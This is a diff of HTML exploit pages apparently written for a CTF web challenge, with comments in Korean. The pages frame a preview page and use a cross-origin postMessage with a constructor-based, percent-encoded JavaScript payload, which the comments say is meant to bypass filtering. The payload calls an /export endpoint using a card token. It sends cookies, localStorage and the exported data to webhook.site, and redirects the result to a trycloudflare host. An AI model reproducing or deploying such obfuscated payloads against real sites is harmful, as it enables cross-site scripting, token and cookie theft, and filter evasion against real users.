@@ -1,59 +1,30 @@
 <!DOCTYPE html>
+<html><head><meta charset="utf-8"></head><body>
+<script>
+var W = "https://weufatt.request.dreamhack.games";
+new Image().src = W + "?step=null_loaded";
+setTimeout(function () {
+  new Image().src = W + "?step=before_pm";
+  try {
+    var PAYLOAD = '[]["fill"]["con"+"structor"](unescape("%66%65%74%63%68%28%27%2F%65%78%70%6F%72%74%27%2C%7B%6D%65%74%68%6F%64%3A%27%50%4F%53%54%27%2C%68%65%61%64%65%72%73%3A%7B%27%58%2D%43%61%72%64%2D%54%6F%6B%65%6E%27%3A%43%41%52%44%5F%54%4F%4B%45%4E%2C%27%43%6F%6E%74%65%6E%74%2D%54%79%70%65%27%3A%27%61%70%70%6C%69%63%61%74%69%6F%6E%2F%6A%61%76%61%73%63%72%69%70%74%27%7D%2C%62%6F%64%79%3A%27%31%27%7D%29%2E%74%68%65%6E%28%66%75%6E%63%74%69%6F%6E%28%72%29%7B%72%65%74%75%72%6E%20%72%2E%73%74%61%74%75%73%7D%29%2E%74%68%65%6E%28%66%75%6E%63%74%69%6F%6E%28%73%29%7B%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%73%3A%2F%2F%70%65%72%73%6F%6E%61%6C%69%7A%65%64%2D%64%65%6E%6E%69%73%2D%63%61%6C%65%6E%64%61%72%2D%61%6C%62%61%6E%79%2E%74%72%79%63%6C%6F%75%64%66%6C%61%72%65%2E%63%6F%6D%2F%70%72%6F%62%65%3F%65%78%70%3D%27%2B%73%7D%29%2E%63%61%74%63%68%28%66%75%6E%63%74%69%6F%6E%28%65%29%7B%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%73%3A%2F%2F%70%65%72%73%6F%6E%61%6C%69%7A%65%64%2D%64%65%6E%6E%69%73%2D%63%61%6C%65%6E%64%61%72%2D%61%6C%62%61%6E%79%2E%74%72%79%63%6C%6F%75%64%66%6C%61%72%65%2E%63%6F%6D%2F%70%72%6F%62%65%3F%65%72%72%3D%27%2B%65%73%63%61%70%65%28%53%74%72%69%6E%67%28%65%29%29%7D%29"))()';
+    parent.frames[0].postMessage(PAYLOAD, "*");
+    new Image().src = W + "?step=after_pm_ok";
+  } catch (e) {
+    new Image().src = W + "?step=pm_error&e=" + encodeURIComponent(String(e));
+  }
+}, 2500);
+</script>
+</body></html>
+<!DOCTYPE html>
 <html>
-<head>
-    <meta charset="utf-8">
-    <title>CTF Unified Exploit</title>
-</head>
+<head><meta charset="utf-8"><title>card</title></head>
 <body>
-    <script>
-        // 1. 웹훅 URL 설정 (여기를 본인 주소로 수정하세요)
-        const W = "https://webhook.site/29d1e2bb-f7e3-4dbe-a679-f520fe066a12"; 
-
-        // 2. 디버깅 및 플래그 탈취 페이로드
-        // 봇의 환경을 덤프하고 웹훅으로 쏴주는 디버깅 로직 포함
-        const DEBUG_PAYLOAD = `
-            const debug = {
-                cookies: document.cookie,
-                location: location.href,
-                localStorage: JSON.stringify(localStorage),
-                bodyPreview: document.body.innerText.substring(0, 500)
-            };
-            
-            try {
-                // 팀원의 페이로드 구조 (fetch를 이용한 export 호출)
-                fetch("/export", {
-                    method: "POST",
-                    headers: { "X-Card-Token": CARD_TOKEN, "Content-Type": "application/javascript" },
-                    body: "1"
-                })
-                .then(r => r.text())
-                .then(data => {
-                    debug.exportedData = data;
-                    fetch("${W}?data=" + encodeURIComponent(JSON.stringify(debug)));
-                });
-            } catch(e) {
-                debug.error = e.message;
-                fetch("${W}?error=" + encodeURIComponent(JSON.stringify(debug)));
-            }
-        `;
-
-        // 3. 인코딩하여 필터링 우회
-        const PAYLOAD = '[]["fill"]["con"+"structor"](unescape("' + escape(DEBUG_PAYLOAD) + '"))()';
-
-        // 4. 봇 공격 환경 구성
-        window.onload = () => {
-            const iframe = document.getElementById("preview");
-            // 로딩 대기 후 메시지 전송
-            setTimeout(() => {
-                try {
-                    iframe.contentWindow.postMessage(PAYLOAD, "*");
-                } catch (e) {
-                    new Image().src = W + "?pm_error=" + encodeURIComponent(e.message);
-                }
-            }, 1000);
-        };
-    </script>
-
-    <iframe id="preview" src="http://localhost:5000/preview" style="width:100%; height:500px;"></iframe>
+<script>
+new Image().src="https://webhook.site/149bbb66-ae4b-4344-9f6d-76107e951a2e?step=attack_loaded";
+</script>
+<!-- 1) 챌린지 preview 프레이밍 (봇 기준 localhost:5000) -->
+<iframe id="preview" src="http://localhost:5000/preview"></iframe>
+<!-- 2) null-origin iframe → preview로 postMessage -->
+<iframe sandbox="allow-scripts" src="null.html"></iframe>
 </body>
 </html>
